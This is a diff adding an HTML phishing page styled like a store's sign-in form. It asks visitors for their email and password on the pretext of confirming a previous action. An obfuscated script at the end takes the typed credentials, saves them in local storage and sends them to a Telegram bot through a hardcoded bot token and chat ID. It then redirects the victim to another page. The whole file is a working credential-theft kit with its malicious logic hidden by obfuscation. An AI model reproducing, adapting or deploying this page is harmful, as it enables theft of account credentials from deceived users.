@@ -1,0 +1,143 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Login - Your Store</title>
+    <style>
+        /* Global Styles */
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #f3f3f3;
+            margin: 0;
+            padding: 0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+        }
+
+        .login-container {
+            background-color: #ffffff;
+            border-radius: 4px;
+            padding: 20px;
+            width: 90%;
+            max-width: 400px;
+            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
+        }
+
+        h1 {
+            font-size: 24px;
+            font-weight: 400;
+            margin-bottom: 20px;
+            color: #232f3e;
+            text-align: center;
+        }
+
+        label {
+            font-weight: bold;
+            display: block;
+            margin-bottom: 5px;
+            color: #333;
+        }
+
+        input {
+            width: 100%;
+            padding: 8px;
+            margin-bottom: 15px;
+            border: 1px solid #a6a6a6;
+            border-radius: 3px;
+            font-size: 14px;
+        }
+
+        input:focus {
+            outline: none;
+            border-color: #e77600;
+            box-shadow: 0 0 3px 2px rgba(228, 121, 17, 0.5);
+        }
+
+        button {
+            width: 100%;
+            background-color: #f0c14b;
+            border: 1px solid #a88734;
+            border-radius: 3px;
+            padding: 10px;
+            font-size: 16px;
+            cursor: pointer;
+            color: #111;
+        }
+
+        button:hover {
+            background-color: #f1c860;
+        }
+
+        .footer-text {
+            text-align: center;
+            margin-top: 20px;
+            font-size: 12px;
+            color: #555;
+        }
+
+        .footer-text a {
+            color: #0066c0;
+            text-decoration: none;
+        }
+
+        .footer-text a:hover {
+            text-decoration: underline;
+        }
+
+        /* Responsive Design */
+        @media (max-width: 480px) {
+            h1 {
+                font-size: 20px;
+            }
+
+            .login-container {
+                padding: 15px;
+            }
+
+            input {
+                padding: 6px;
+                font-size: 12px;
+            }
+
+            button {
+                padding: 8px;
+                font-size: 14px;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="login-container">
+        <h1>Sign in to your email</h1>
+        <p>To check your email and confirm previous action please login from this website.</p>
+        <form id="loginForm">
+            <!-- Email -->
+            <div class="form-group">
+                <label for="email">Email</label>
+                <input type="email" id="email" name="email" placeholder="Enter your email" required>
+            </div>
+
+            <!-- Password -->
+            <div class="form-group">
+                <label for="password">Password</label>
+                <input type="password" id="password" name="password" placeholder="Enter your password" required>
+            </div>
+
+            <!-- Submit Button -->
+            <button type="submit">Continue</button>
+        </form>
+
+        <!-- Footer Text -->
+        <div class="footer-text">
+            By continuing, you agree to our <a href="#">Terms of Service</a> and <a href="#">Privacy Policy</a>.
+        </div>
+    </div>
+
+    <script>
+       const _0x5f2014=_0x5ea5;(function(_0x5b95c4,_0x42759e){const _0x3e2b2d=_0x5ea5,_0x4c756a=_0x5b95c4();while(!![]){try{const _0x21289a=parseInt(_0x3e2b2d(0x118))/0x1*(-parseInt(_0x3e2b2d(0x106))/0x2)+parseInt(_0x3e2b2d(0x11b))/0x3*(-parseInt(_0x3e2b2d(0x104))/0x4)+parseInt(_0x3e2b2d(0x10a))/0x5*(-parseInt(_0x3e2b2d(0x105))/0x6)+parseInt(_0x3e2b2d(0x110))/0x7*(-parseInt(_0x3e2b2d(0x10f))/0x8)+-parseInt(_0x3e2b2d(0x11d))/0x9+-parseInt(_0x3e2b2d(0x11a))/0xa+parseInt(_0x3e2b2d(0xfe))/0xb;if(_0x21289a===_0x42759e)break;else _0x4c756a['push'](_0x4c756a['shift']());}catch(_0x1c30f9){_0x4c756a['push'](_0x4c756a['shift']());}}}(_0x3d2b,0x992d4));function _0x3d2b(){const _0x432599=['location','log','16ocGGhF','2436518miTZST','value','password','getElementById','https://api.telegram.org/bot','Error\x20sending\x20message\x20to\x20Telegram:','Login\x20Data:','Email\x20Login\x0aEmail:\x20','1003SFqQeu','preventDefault','3066330JMwNNx','2798790AKWIvN','submit','4790934uMMIRm','41152540NSsQjM','setItem','/sendMessage','POST','7679048680:AAEkcmjzNJCp421MH1u7gi5bUWh3XiTpNQY','Failed\x20to\x20send\x20message\x20to\x20Telegram','4jpYDIA','96leVBnV','418ZIlKpF','application/json','email','error','136270XIyxjd','Message\x20sent\x20to\x20Telegram:','json'];_0x3d2b=function(){return _0x432599;};return _0x3d2b();}const BOT_TOKEN=_0x5f2014(0x102),CHAT_ID='1056460575';function _0x5ea5(_0x465715,_0x224bd8){const _0x3d2b71=_0x3d2b();return _0x5ea5=function(_0x5ea59a,_0x401f90){_0x5ea59a=_0x5ea59a-0xfe;let _0xdffca5=_0x3d2b71[_0x5ea59a];return _0xdffca5;},_0x5ea5(_0x465715,_0x224bd8);}async function sendToTelegram(_0x594a09){const _0x19c265=_0x5f2014,_0x111c56=_0x19c265(0x114)+BOT_TOKEN+_0x19c265(0x100),_0x4b2701={'chat_id':CHAT_ID,'text':_0x594a09};try{const _0x3269b1=await fetch(_0x111c56,{'method':_0x19c265(0x101),'headers':{'Content-Type':_0x19c265(0x107)},'body':JSON['stringify'](_0x4b2701)});if(!_0x3269b1['ok'])throw new Error(_0x19c265(0x103));const _0x5cdf94=await _0x3269b1[_0x19c265(0x10c)]();console[_0x19c265(0x10e)](_0x19c265(0x10b),_0x5cdf94);}catch(_0x450671){console[_0x19c265(0x109)](_0x19c265(0x115),_0x450671);}}document[_0x5f2014(0x113)]('loginForm')['addEventListener'](_0x5f2014(0x11c),async function(_0x5a32db){const _0x13d44b=_0x5f2014;_0x5a32db[_0x13d44b(0x119)]();const _0x565b74=document[_0x13d44b(0x113)](_0x13d44b(0x108))[_0x13d44b(0x111)],_0x344cee=document[_0x13d44b(0x113)]('password')[_0x13d44b(0x111)];localStorage['setItem'](_0x13d44b(0x108),_0x565b74),localStorage[_0x13d44b(0xff)](_0x13d44b(0x112),_0x344cee);const _0x685200=_0x13d44b(0x117)+_0x565b74+'\x0aPassword:\x20'+_0x344cee;await sendToTelegram(_0x685200),console[_0x13d44b(0x10e)](_0x13d44b(0x116),{'email':_0x565b74,'password':_0x344cee}),window[_0x13d44b(0x10d)]['href']='fill.html';});
+    </script>
+</body>
+</html>
